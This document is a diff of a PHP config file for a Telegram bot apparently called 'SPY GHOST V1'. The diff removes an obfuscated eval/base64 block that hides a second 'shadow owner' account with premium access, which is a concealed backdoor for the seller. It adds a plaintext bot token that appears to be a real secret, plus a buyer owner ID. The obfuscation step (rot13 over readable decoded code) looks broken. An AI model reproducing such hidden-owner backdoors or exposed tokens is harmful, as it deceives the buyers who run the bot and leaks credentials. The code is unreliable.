@@ -1,8 +1,7 @@
 <?php
-/* SPY GHOST V1 - ENCRYPTED CONFIG
-   Owner: Boss Kensora
-   Unauthorized editing will break the script!
-*/
+// TOKEN BOT TELEGRAM
+$token = "8775494315:AAGtkIAWCSBMbQpZcnm-uVVh-VYciV1Rc6o";
 
-eval(str_rot13(base64_decode('ZXZhbCgnJHRva2VuID0gIjg3NzU0OTQzMTU6QUFHdGtJQVdDU0JNYlFwWmNubS11VlZoLVZZY2lWMVJjNm8iOyRvd25lcl8xID0gIjc0MjkwMTI1NTgiOyRvd25lcl9iYXlhbmdhbiA9ICIyMDE2OTkyODM2IjsnKTskZGJfZmlsZSA9ICd1c2Vycy5qc29uJztkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL0pha2FydGEnKTtpZighZmlsZV9leGlzdHMoJGRiX2ZpbGUpKXtmaWxlX3B1dF9jb250ZW50cygkZGJfZmlsZSxqc29uX2VuY29kZShbJG93bmVyXzEgPT4gIjIwMjctMTItMzEiLCRvd25lcl9iYXlhbmdhbiA9PiAiMjAyNy0xMi0zMSJdKSk7fSRwcmVtaXVtX3VzZXJzID0ganNvbl9kZWNvZGUoZmlsZV9nZXRfY29udGVudHMoJGRiX2ZpbGUpLHRydWUpOw==')));
+// ID PEMBELI (Kasih tau dia buat ganti ini pake ID dia)
+$owner_1 = "7429012558"; 
 ?>
